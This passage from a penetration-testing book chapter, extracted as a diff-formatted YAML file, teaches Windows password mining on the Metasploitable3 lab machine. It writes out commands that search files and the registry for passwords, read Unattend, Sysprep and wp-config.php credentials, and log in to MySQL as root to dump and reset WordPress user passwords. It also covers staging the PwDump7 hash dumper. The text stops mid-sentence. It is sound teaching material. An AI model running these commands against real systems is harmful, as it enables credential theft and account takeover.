@@ -1,0 +1,1559 @@
+- en: '*Chapter 7*: Windows Password Mining'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: An important privilege escalation attack vector that usually goes unexplored
+    is the process of searching for locally stored credentials on the target system.
+    This process involves searching for specific passwords and password hashes that
+    can then be used to elevate privileges directly, without the use of any exploits.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This chapter will focus on the process of searching for passwords and dumping
+    password hashes on the target system by using various utilities and techniques.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We will also take a look at how Windows **NT LAN Manager** (**NTLM**) hashes
+    can be cracked and utilized to elevate privileges on a target system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this chapter, we''re going to cover the following main topics:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: What is password mining?
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Searching for passwords in files
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Searching for passwords in Windows configuration files
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Searching for application passwords
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Dumping Windows hashes
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Cracking Windows hashes
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Technical requirements
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: To follow along with the demonstrations in this chapter, you will need to ensure
+    that you are familiar with Windows CMD commands.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You can view this chapter''s code in action here: [https://bit.ly/3ogOyCN](https://bit.ly/3ogOyCN)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: What is password mining?
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: '**Password mining** is the process of searching for and enumerating encrypted
+    or cleartext passwords stored in persistent or volatile memory on the target system.
+    The primary objective of this process involves identifying potentially useful
+    user accounts and application passwords, which can then expand our authority over
+    a target system and potentially provide us with elevated privileges.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Given the nature of Windows configurations and deployment use cases, this process
+    will differ from target to target. Therefore, it is important to have a good understanding
+    of how and where passwords, both encrypted and cleartext, are stored on Windows.
+  prefs: []
+  type: TYPE_NORMAL
+- en: It is also important to understand that this process relies on a series of vulnerabilities
+    that are a result of an organization's or individual's password security practices.
+    Poor password security practices are the primary target for attackers as they
+    provide a straightforward access vector, without the need for further system exploitation
+    or compromise.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Because of the amount of credentials that are required by various platforms
+    and applications, employees and individuals are prone to saving their credentials
+    on their systems in cleartext, usually in **.doc**, **.txt**, or **.xlsx** files
+    for ease of access, and are more likely to use weaker passwords that comprise
+    events, names, or dates that are relevant to them. This is a significant threat
+    to the security of an organization and as a result, most organizations enforce
+    a password security policy as a means of remediating these issues.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Password security policies are used to establish a baseline security level for
+    user account passwords and enforce the secure storage and use of stronger passwords
+    that comprise words (both uppercase and lowercase), symbols, and numbers with
+    a recommended minimum length of 8 digits. However, this gives rise to the occurrence
+    of password reuse, where employees and individuals are likely to reuse the same
+    password for multiple accounts, primarily because of the complex nature of the
+    passwords they are required to use. This allows attackers to gain access to multiple
+    accounts by compromising a single password.
+  prefs: []
+  type: TYPE_NORMAL
+- en: An additional security vulnerability or risk involves Windows user account passwords
+    and how they are stored. Windows encrypts and stores user account passwords locally
+    and in memory. After initial access has been obtained by an attacker, user account
+    hashes can be dumped from memory and can be cracked, depending on the length and
+    strength of the password. We will explore the advantages and drawbacks of this
+    technique later in this chapter.
+  prefs: []
+  type: TYPE_NORMAL
+- en: From an organizational standpoint, Windows is also used to host third-party,
+    business-critical applications that come with their own security vulnerabilities.
+    Most of these applications implement some form of access control and, consequently,
+    require user authentication in the form of a username and password combination.
+    These applications are also prone to storing credentials locally in either cleartext
+    or in encrypted format. After successfully exploiting an application, attackers
+    can locate these credentials, decrypt them (if they're weak), and use them to
+    gain access to the application and, consequently, expand their domain of control
+    over a system or network.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this chapter, we will be using the Metasploitable3 target virtual machine
+    that we set up in [*Chapter 2*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030),
+    *Setting Up Our Lab*.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Metasploitable3 is an intentionally vulnerable virtual machine that runs on
+    **Windows Server 2008 R2** and hosts a plethora of applications, from web apps
+    to databases.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This robust configuration of applications provides a great real-world scenario
+    for a practical demonstration of the tools and techniques that we will be using
+    in this chapter.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Before we begin, ensure that you have a foothold of the target system and have
+    access through a command shell or meterpreter session.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The techniques and tools that will be used in this chapter will involve utilizing
+    native Windows commands and specific meterpreter modules, to help automate various
+    aspects of the password mining and dumping process.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Searching for passwords in files
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: The first step of this process involves searching for passwords in various files
+    stored locally. This will allow us to identify any user or application passwords
+    in text or configuration files. This can be achieved by using built-in Windows
+    utilities that allow us to search for specific strings in files with specific
+    extensions.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We will begin this process by following the different procedures outlined here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first step involves searching the local filesystem for a specific string.
+    In this case, the string we will be searching for is **password**. This will enumerate
+    all occurrences of the string, their values, and their respective filenames and
+    locations. This can be done by running the **findstr** utility in the Windows
+    command shell:'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**findstr /si password *.txt**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command will perform a case-sensitive search for the **password** string
+    in all subdirectories.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Note
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**findstr** is a Windows utility that is used to search for strings in files
+    and can be used in conjunction with various regular expressions to fine tune your
+    searches.'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: To perform a thorough search, it is recommended to run the **findstr** utility
+    at the root of the Windows filesystem. This can be done by navigating to the **C:\\**
+    directory and initiating the search from there.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This will output a list of all **.txt** files that contain the **password**
+    string, as illustrated in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.1 – findstr results'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_001.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.1 – findstr results
+  prefs: []
+  type: TYPE_NORMAL
+- en: The command will output a lot of information based on the configuration of the
+    system and the number of applications that have been installed. As a result, it
+    is recommended to output the results to a file for in-depth analysis as the results
+    can be tedious to analyze manually.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can also use the **findstr** utility to search for the **password** string
+    in ***.xml** files. This can be done by running the following command:'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**findstr /si password *.xml**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: As shown in the following screenshot, this will output a list of all occurrences
+    of the **password** string in **.xml** files.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'You can also fine-tune your search to limit the results to the files that contain
+    occurrences of the string by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**findstr /si /m "password" *.xml *.ini *.txt**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This will limit the output of the search to the files that have the string
+    specified in the search query:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.2 – finstr XML results'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_002.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.2 – finstr XML results
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can also perform a comprehensive search for a specific string in all the
+    files and directories on the target system. This can be done by running the following
+    command:'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**findstr /spin "password" *.* -**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command will output all files, regardless of their formats or extensions,
+    that have occurrences of the **password** string within them.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Based on the deployment use case of the target, you may receive a lot of matches
+    for the **password** string or none at all. We will take a closer look at how
+    to fine-tune our searches based on the type of password we are looking for in
+    the next section.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can also search for various strings in files by using the **dir** command
+    on Windows. This can be done by running the following command:'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**dir /s *pass* == *cred* == *vnc* == *.config***'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As shown in the following screenshot, the command will output all occurrences
+    of the strings specified and their respective locations. This particular scan
+    is much more comprehensive and has a higher probability of returning useful and
+    actionable results:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.3 – Directory search results'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_003.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.3 – Directory search results
+  prefs: []
+  type: TYPE_NORMAL
+- en: As highlighted in the preceding screenshot, the search reveals the location
+    of files that contain the strings specified in the search. In this particular
+    case, we can identify the location of the local and domain passwords for the **GlassFish**
+    server. We can use these credentials to take control of the service.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We will take a closer look at how to search for application-specific passwords
+    in the upcoming sections and how they can be used to elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we know how to search for useful strings in files on the target system,
+    we will take a look at how to search for passwords in Windows configuration files.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Searching for passwords in Windows configuration files
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Windows can automate a variety of repetitive tasks, such as the mass rollout
+    or installation of Windows on many systems. An example of this is the **Unattended
+    Windows Setup** utility, which automates the mass installation of Windows. This
+    tool utilizes configuration files that contain specific configurations and user
+    account credentials that can be used by attackers to elevate privileges. In this
+    section, we will be taking a look at how to search for and identify the configuration
+    files that are used during the Unattended Windows Setup process.
+  prefs: []
+  type: TYPE_NORMAL
+- en: It is important to note that this technique will vary based on the version of
+    Windows being use, as well as whether Windows was installed using the Unattended
+    Windows Setup utility. Given the typical use case of the Unattended Windows Setup
+    utility, this method will be useful when it's employed in an organization-specific
+    environment. However, you may run into individual systems that utilize the Unattended
+    Windows Setup utility.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In our case, our target system was not set up and configured using the Unattended
+    Windows Setup utility, so the following techniques will not be directly applicable.
+    However, it is a vitally important aspect of the password mining process:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first step involves searching for and identifying the Unattended Windows
+    Setup configuration files that were left over. The names of the configuration
+    file will vary based on the version of Windows that''s been installed. The file
+    typically has one of the following names:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '- **Unattend.xml**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '- **Autounattend.xml**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The location of the configuration file will also depend on the version of Windows
+    that''s been installed and can typically be found in one of the following locations:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: C:\\Windows\Panther\Unattend\Unattended.xml
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: C:\\Windows\Panther\Unattdended.xml
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following Terminal output, if the configuration file
+    exists, it should contain the **Administrator** password in cleartext or encoded
+    in Base64 so that it can be decrypted to reveal the cleartext password:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35"
+    language="neutral" versionScope="nonSxS" processorArchitecture="amd64">**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**    <AutoLogon>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**     <Password>UGFzc3dvcmQxMjM=</Password>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**     <Enabled>true</Enabled>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**     <Username>Administrator</Username>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**    </AutoLogon>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**    <UserAccounts>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**     <LocalAccounts>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**      <LocalAccount wcm:action="add">**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**       <Password>*SENSITIVE*DATA*DELETED*</Password>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**       <Group>administrators;users</Group>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**       <Name>Administrator</Name>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**      </LocalAccount>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**     </LocalAccounts>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**    </UserAccounts>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The encrypted password can be decrypted using the built-in base64 utility on
+    Kali Linux. This can be done by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**echo "<ENCRYPTED-PASSWORD>" | base64 -d**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Windows installations can also be automated using a Windows utility called **Sysprep**.
+    Sysprep is used to deploy Windows images to different systems and can also be
+    used in conjunction with the Windows Unattended Setup utility to prepare the image
+    for deployment.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'Similarly, **Sysprep** also utilizes configuration files that contain customizations
+    and user credentials. If these files are not cleaned up, they can reveal useful
+    credentials. The name of the configuration file will vary based on the version
+    of Windows that''s been installed. The file typically has one of the following
+    names:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '- **Sysprep.inf**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '- **Sysprep.xml**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The location of the configuration file will also depend on the version of Windows
+    that''s been installed and can typically be found under one of the following locations:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: C:\\sysprep.inf
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: C:\\sysprep\sysprep.xml
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, If the configuration file exists,
+    it should contain the administrator password in cleartext:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.4 – Sysprep.xml password'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_004.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 7.4 – Sysprep.xml password
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: If these configuration files exist, they offer a straightforward path to authenticate
+    to the system as the admin user attains elevated privileges.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The next point of interest in Windows is its registry. The Windows Registry
+    is a database that is responsible for storing settings and configurations for
+    Windows and other applications installed on the system. We can search the registry
+    for specific strings to reveal user credentials. This can be done by running the
+    following commands:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**reg query HKLM /f password /t REG_SZ /s**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**reg query HKCU /f password /t REG_SZ /s**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, this will output all the registry
+    entries that match the **password** string:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.5 – Windows Registry search](Images/B17389_07_005.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 7.5 – Windows Registry search
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this particular case, we did not find anything of interest. As a result,
+    we will now turn our attention to finding and enumerating application-specific
+    passwords.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Searching for application passwords
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Applications are an enticing target for attackers when they have weaknesses
+    and vulnerabilities in them. How they store credentials can lead to complete system
+    compromise or elevated privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This section will focus on finding and enumerating application credentials.
+    The techniques demonstrated in this section will depend on the type of target
+    you are dealing with and its deployment use case. In our particular case, our
+    target virtual machine has been set up as a server and has various applications
+    installed on it.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In [*Chapter 3*](B17389_03_Final_PG_ePub.xhtml#_idTextAnchor045), *Gaining
+    Access (Exploitation)*, we performed a comprehensive Nmap scan on our target and
+    identified several applications, most of which were web applications that utilize
+    some form of authentication. These are some of the applications we can target:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: MySQL Server
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: phpMyAdmin
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: WordPress
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Let''s learn how to find and identify the configuration files that are used
+    to store credentials by these applications:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The first step in this process is to identify the web hosting stack being used.
+    As highlighted in the following screenshot, navigating to the root of the filesystem
+    reveals that the hosting stack that's been installed is **Windows Apache MySQL
+    PHP** (**WAMP**):![Figure 7.6 – WAMP](Images/B17389_07_006.jpg)
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Figure 7.6 – WAMP
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can explore the contents of the **wamp** directory to determine what web
+    applications are being hosted. This can be done by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**cd wamp\www\**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, the contents of the directory reveal
+    that WordPress has been installed on the server:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.7 – WordPress directory'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_007.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 7.7 – WordPress directory
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**WordPress** is a content management system that requires a database – in
+    this case, **MySQL** – to store data and user credentials. Connecting to the database
+    is facilitated through a remote connection, and the database access credentials
+    are stored in the **wp-config.php** file. We can list the contents of this file
+    by navigating into the WordPress installation directory and running the following
+    command in the Windows command shell:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**type wp-config.php**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, the content of the file reveals
+    the MySQL username and password combination that we can use to log in:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.8 – wp-config.php MySQL credentials'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_008.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 7.8 – wp-config.php MySQL credentials
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'In this case, we can get the root username and password for the MySQL server
+    and log in remotely from Kali by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**mysql -u root -p -h <TARGET-IP>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, after successful authentication,
+    we should now have root access to the MySQL Server and view and dump the contents
+    of any database on the server:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.9 – MySQL login'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_009.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 7.9 – MySQL login
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now dump the list of databases on the server. This can be done by running
+    the following command in the MySQL prompt:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**show databases;**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, the command will output a list
+    of databases on the server:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.10 – MySQL databases](Images/B17389_07_010.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_IMG
+- en: Figure 7.10 – MySQL databases
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can dump the contents of the WordPress database by running the following
+    command in the MySQL prompt:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**use wordpress;**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This reveals a list of tables in the WordPress database. We can dump the user
+    credentials for the WordPress installation by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**select * from wp_users;**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, this will reveal the WordPress
+    user''s credentials:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.11 – WordPress credentials'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_011.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 7.11 – WordPress credentials
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The user passwords are encrypted in MD5 and can be decrypted to reveal the cleartext
+    password.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Additionally, given the fact that we have root access to the MySQL server,
+    we can change the password for the admin account by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**update wp_users set user_pass = MD5(''password123!'') where ID = 1;**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: We can now log into the WordPress admin dashboard with the password we have
+    just set and should have administrative control over the WordPress site.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: So far, we have taken control of the MySQL Server and the WordPress site. Now,
+    let's find the credentials of the other applications.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The server is also running phpMyAdmin. We can gain access to the phpMyAdmin
+    control panel by accessing the content of the file, as follows:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**C:\wamp\apps\phpmyadmin3.4.10.1\config.inc.ini.php**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, this will reveal the access credentials
+    for the phpMyAdmin control panel:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 7.12 – phpMyAdmin credentials'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_012.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.12 – phpMyAdmin credentials
+  prefs: []
+  type: TYPE_NORMAL
+- en: We should now have root access to the phpMyAdmin control panel and be able to
+    create, modify, and delete the contents of databases.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we have taken control of the MySQL Server and the WordPress site, we
+    can start dumping Windows user account hashes to elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Dumping Windows hashes
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this section, we will take a closer look at Windows passwords and how they
+    are hashed. The hash dumping process on Windows can be performed by using various
+    techniques and tools, most of which we will explore in this section. Before we
+    begin using any tools or techniques, we need to take a brief look at how Windows
+    passwords are stored.
+  prefs: []
+  type: TYPE_NORMAL
+- en: SAM database
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: '**Security Account Manager** (**SAM**) is a database that is responsible for
+    managing user accounts and passwords on Windows. All the passwords that are stored
+    in the SAM database are hashed. Authentication and verification of user credentials
+    is facilitated by the **local security authority** (**LSA**).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The SAM database is stored in the Windows Registry and can be accessed from
+    the following location:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: HKEY_LOCAL_MACHINE\SAM
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we know where Windows user credentials are stored, we need to take
+    a closer look at **LanMan** (**LM**) and NTLM authentication.
+  prefs: []
+  type: TYPE_NORMAL
+- en: LM and NTLM hashing
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'LM is an authentication protocol that''s developed by IBM and widely implemented
+    in Windows operating systems prior to NT4.0\. The protocol is used to encrypt
+    user passwords, and the hashing process can be broken down into the following
+    steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The password is converted into a hash by breaking it into two seven-character
+    chunks.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: All characters are then converted into uppercase.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Each chunk is then encrypted with a 56-bit DES key.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'LM is generally considered to be a weak protocol and can easily be cracked,
+    primarily because of the following reasons:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The 56-bit DES key is weak and can be cracked relatively easily.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Because the characters are converted into uppercase, this makes the cracking
+    process relatively simple through a brute-force or dictionary attack.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Versions of Windows that utilize LM are restricted to a maximum of 14 characters
+    for user account passwords.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Now that we understand how LM hashing works, we can look at NTLM hashing, which
+    is an improvement in terms of security over LM.
+  prefs: []
+  type: TYPE_NORMAL
+- en: NTLM is a collection of authentication protocols that are utilized in Windows
+    to facilitate authentication between computers. The authentication process involves
+    using a valid username and password to authenticate successfully.
+  prefs: []
+  type: TYPE_NORMAL
+- en: NTLM authentication operates under the client-server model of communication
+    and involves a handshake process, similar to the TCP three-way handshake. We explored
+    the NTLM authentication process in the previous chapter, so we will only be exploring
+    the differences between LM and NTLM hashing here.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'NTLM operates under a challenge response system, and the hashing process can
+    be broken down into the following steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: When a user account is created, it is encrypted using the MD4 hashing algorithm,
+    while the original password is disposed of.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: During authentication, the username is sent to the server. The server then creates
+    a 16-byte random string and sends it to the client. This is known as the challenge.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The client encrypts the string with the password hash using the **Data Encryption
+    Standard** (**DES**) algorithm and sends it back to the server. This is known
+    as the response.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The server then compares the hashed string (response) to the original. If it
+    matches, authentication is completed.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'The following table highlights the key differences between LM and NTLM and
+    how each protocol handles encryption:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![](Images/B17389_07_Table1.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Now that we understand how LM and NTLM hashing works, we can begin exploring
+    the process of dumping hashes on our target system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Utilizing PwDump7
+  prefs:
+  - PREF_H3
+  type: TYPE_NORMAL
+- en: 'The first tool we will be utilizing is called **PwDump7.exe**. It is a Windows
+    binary that extracts the SAM database and dumps the hashes. It needs to be run
+    locally on the target system. You can download the binary from this link: [https://www.tarasco.org/security/pwdump_7/](https://www.tarasco.org/security/pwdump_7/).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'After downloading the binary, we need to transfer it to the target system.
+    This can be done automatically through meterpreter by running the following command
+    in the meterpreter shell:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: upload ~/Downloads/pwdump7/PwDump7.exe
+  prefs: []
+  type: TYPE_NORMAL
+- en: Alternatively, if you are running a standard command shell, we will need to
+    set up a web server on our Kali VM. This will be used to host the binary so that
+    we can download it on the target system. This can be done by following the procedure
+    outlined here.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
+    Python module to serve the binary file. This can be done by running the following
+    command in the directory where the **PwDump7.exe** binary is stored:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: sudo python -m SimpleHTTPServer 80
+  prefs: []
+  type: TYPE_NORMAL
+- en: To download the **PwDump7.exe** binary on the target system, we can utilize
